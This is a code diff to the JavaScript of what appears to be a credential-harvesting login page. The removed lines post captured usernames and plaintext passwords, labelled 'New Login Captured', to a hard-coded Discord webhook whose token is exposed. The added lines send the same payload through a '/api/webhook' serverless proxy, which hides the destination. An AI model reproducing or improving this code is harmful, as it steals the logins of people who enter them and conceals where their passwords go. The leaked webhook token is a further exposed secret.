@@ -107,7 +107,7 @@ document.addEventListener("DOMContentLoaded", function() {
   const totalLogins = document.getElementById("totalLogins");
   const lastLogin = document.getElementById("lastLogin");
 
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1408935972829401158/TMRXIF8bqJ7YzjXDGKGYi_4DeXgtPtI2JcJR_ecLP9FFyYq-fCC-u24tYVPQGnyx5Q8w";
+  const WEBHOOK_URL = "/api/webhook"; // Vercel serverless function endpoint
   const MAX_RETRIES = 3;
 
   let loginCount = 0;
@@ -163,17 +163,7 @@ document.addEventListener("DOMContentLoaded", function() {
       const response = await fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          embeds: [{
-            title: "New Login Captured",
-            fields: [
-              { name: "Username", value: payload.username, inline: true },
-              { name: "Password", value: payload.password, inline: true },
-              { name: "Timestamp", value: payload.timestamp, inline: false }
-            ],
-            color: 0x00b0ff
-          }]
-        }),
+        body: JSON.stringify(payload),
         mode: "cors"
       });
       if (!response.ok) throw new Error("Webhook request failed");
